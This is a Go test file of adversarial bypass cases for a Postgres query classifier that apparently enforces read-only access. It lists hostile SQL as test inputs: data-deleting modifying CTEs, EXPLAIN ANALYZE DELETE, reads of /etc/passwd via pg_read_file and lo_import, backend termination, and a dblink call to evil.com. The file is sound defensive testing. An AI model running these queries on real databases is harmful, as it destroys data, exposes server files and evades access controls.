//go:build pg_strict

package postgres_test

// Adversarial breakage tests for the Postgres classifier. Every case
// here was authored as a hypothesised bypass. A FAIL here is a real
// finding the engineer must close (in the classifier or the policy).

import (
	"testing"

	"github.com/dimaggi-ai/tool-guard-core/pkg/sqlguard"
	_ "github.com/dimaggi-ai/tool-guard-core/pkg/sqlguard/postgres"
)

// MODIFYING CTE — Postgres allows INSERT/UPDATE/DELETE/MERGE inside a
// WITH clause that feeds a top-level SELECT. The top-level statement
// looks like a SELECT but the CTE mutates the database during the
// rewrite-and-execute step.
//
// Typical bypass: WITH d AS (DELETE FROM users RETURNING id)
// SELECT * FROM d.
//
// We classify these as IsPureSelect()==false. The classifier MUST
// surface them either as a non-SELECT kind, or via UsesDynamicSQL=true,
// or via some other flag — whatever closes the deny path.
func TestPG_Breakage_ModifyingCTEs(t *testing.T) {
	cases := []string{
		"WITH d AS (DELETE FROM users RETURNING id) SELECT * FROM d",
		"WITH u AS (UPDATE users SET email = 'x' RETURNING id) SELECT * FROM u",
		"WITH i AS (INSERT INTO users VALUES (99, 'evil') RETURNING id) SELECT * FROM i",
		"WITH x AS (DELETE FROM users WHERE id < 100 RETURNING *) SELECT count(*) FROM x",
		`WITH outer_ins AS (
			INSERT INTO audit_log (event) SELECT 'breach' FROM generate_series(1,1000)
			RETURNING id
		)
		SELECT count(*) FROM outer_ins`,
		// MERGE inside a CTE (PG 17 syntax)
		`WITH m AS (MERGE INTO users USING src ON users.id = src.id
			WHEN MATCHED THEN UPDATE SET email='x' RETURNING users.id)
			SELECT * FROM m`,
		// Nested modifying CTE — outer SELECT, middle CTE is SELECT,
		// inner WITH inside an InsertStmt as the SELECT's source.
		`WITH q AS (
			SELECT * FROM (WITH del AS (DELETE FROM users RETURNING id)
				SELECT * FROM del) sub
		) SELECT * FROM q`,
	}
	for _, sql := range cases {
		t.Run(short(sql), func(t *testing.T) {
			cl, err := sqlguard.Classify("postgres", sql)
			if err != nil {
				t.Logf("classifier rejected as parse error: %v  (acceptable — fail-closed)", err)
				return
			}
			// The engine treats MutatesViaCTE as a deny signal when
			// the policy restricts top_level_kinds to read-only.
			// A classifier that doesn't surface ANY of these flags
			// would let the bypass through.
			if cl.IsPureSelect() && !cl.UsesDynamicSQL && !cl.UsesProgram && !cl.MutatesViaCTE {
				t.Errorf("BYPASS: modifying CTE %q classified as pure SELECT with no dynamic/program/cte flag; %+v", sql, cl)
			}
		})
	}
}

// EXPLAIN ANALYZE — runs the analysed statement.
// `EXPLAIN ANALYZE DELETE FROM users` actually deletes. The classifier
// must not let this through as a benign read.
func TestPG_Breakage_ExplainAnalyze(t *testing.T) {
	cases := []string{
		"EXPLAIN ANALYZE DELETE FROM users",
		"EXPLAIN ANALYZE UPDATE users SET email='x'",
		"EXPLAIN (ANALYZE) DELETE FROM users",
		"EXPLAIN (ANALYZE, BUFFERS) INSERT INTO users VALUES (99,'x')",
		"EXPLAIN ANALYZE WITH d AS (DELETE FROM users RETURNING id) SELECT * FROM d",
		// EXPLAIN without ANALYZE is read-only — should still be denied
		// under "top_level=SELECT only" because Explain isn't SELECT.
		"EXPLAIN SELECT * FROM users",
	}
	for _, sql := range cases {
		t.Run(short(sql), func(t *testing.T) {
			cl, err := sqlguard.Classify("postgres", sql)
			if err != nil {
				t.Logf("parse error: %v (fail-closed acceptable)", err)
				return
			}
			if cl.IsPureSelect() {
				t.Errorf("BYPASS: %q classified as pure SELECT; %+v", sql, cl)
			}
		})
	}
}

// SHORTHAND READS — these are legitimate SELECT shapes that should
// pass. The point is to ensure we don't over-block.
func TestPG_Breakage_LegitimateShorthand(t *testing.T) {
	cases := []string{
		"TABLE users",                            // shorthand for SELECT * FROM users
		"VALUES (1), (2), (3)",                   // table-constructor
		"SELECT * FROM (VALUES (1),(2)) AS t(n)", // VALUES in a subquery
		"WITH RECURSIVE r AS (SELECT 1 UNION SELECT n+1 FROM r WHERE n < 10) SELECT * FROM r",
	}
	for _, sql := range cases {
		t.Run(short(sql), func(t *testing.T) {
			cl, err := sqlguard.Classify("postgres", sql)
			if err != nil {
				t.Errorf("legit SQL failed to parse: %v", err)
				return
			}
			// VALUES/TABLE not technically SelectStmt — accept either
			// IsPureSelect OR a recognised read-only kind. The test is
			// here to surface if we accidentally start denying these.
			t.Logf("classified: %+v", cl)
		})
	}
}

// SIDE-EFFECT FUNCTIONS BEYOND pg_read_file — there's a family.
func TestPG_Breakage_DangerousFunctions(t *testing.T) {
	cases := map[string]string{
		"pg_read_file":             "SELECT pg_read_file('/etc/passwd')",
		"pg_read_binary_file":      "SELECT pg_read_binary_file('/etc/passwd')",
		"pg_ls_dir":                "SELECT pg_ls_dir('/etc')",
		"pg_ls_logdir":             "SELECT pg_ls_logdir()",
		"pg_ls_waldir":             "SELECT pg_ls_waldir()",
		"pg_stat_file":             "SELECT pg_stat_file('/etc/passwd')",
		"pg_terminate_backend":     "SELECT pg_terminate_backend(1)",
		"pg_cancel_backend":        "SELECT pg_cancel_backend(1)",
		"pg_reload_conf":           "SELECT pg_reload_conf()",
		"pg_signal_backend":        "SELECT pg_signal_backend(1, 'TERM')",
		"pg_promote":               "SELECT pg_promote()",
		"pg_drop_replication_slot": "SELECT pg_drop_replication_slot('x')",
		"pg_create_logical_repl":   "SELECT pg_create_logical_replication_slot('x','pgoutput')",
		"current_setting":          "SELECT current_setting('password_encryption')",
		"set_config":               "SELECT set_config('search_path', 'public', false)",
		"dblink":                   "SELECT * FROM dblink('host=evil.com', 'SELECT 1') AS t(c int)",
		"lo_import":                "SELECT lo_import('/etc/passwd')",
		"lo_export":                "SELECT lo_export(12345, '/tmp/exfil')",
	}
	allow := []string{"count", "sum", "avg", "min", "max", "now", "current_timestamp", "lower", "upper"}
	for name, sql := range cases {
		t.Run(name, func(t *testing.T) {
			cl, err := sqlguard.Classify("postgres", sql)
			if err != nil {
				t.Fatalf("parse: %v", err)
			}
			fn, bad := cl.HasDisallowedFunction(allow)
			if !bad {
				t.Errorf("BYPASS: %q reached SELECT without flagging a disallowed function; %+v", sql, cl)
			} else {
				t.Logf("caught via fn-allowlist: %q", fn)
			}
		})
	}
}

// DEEPLY NESTED — make sure the classifier doesn't crash or hang on
// pathologically deep CTEs / subqueries.
func TestPG_Breakage_DeepNesting(t *testing.T) {
	// 50 levels of WITH ... AS (SELECT ...) wrapping
	sql := "SELECT 1"
	for i := 0; i < 50; i++ {
		sql = "WITH x AS (" + sql + ") SELECT * FROM x"
	}
	cl, err := sqlguard.Classify("postgres", sql)
	if err != nil {
		t.Logf("parse error on 50-deep nest: %v (fail-closed acceptable)", err)
		return
	}
	if !cl.IsPureSelect() {
		t.Errorf("50-deep wrapped SELECT lost its SELECT identity: %+v", cl)
	}
}
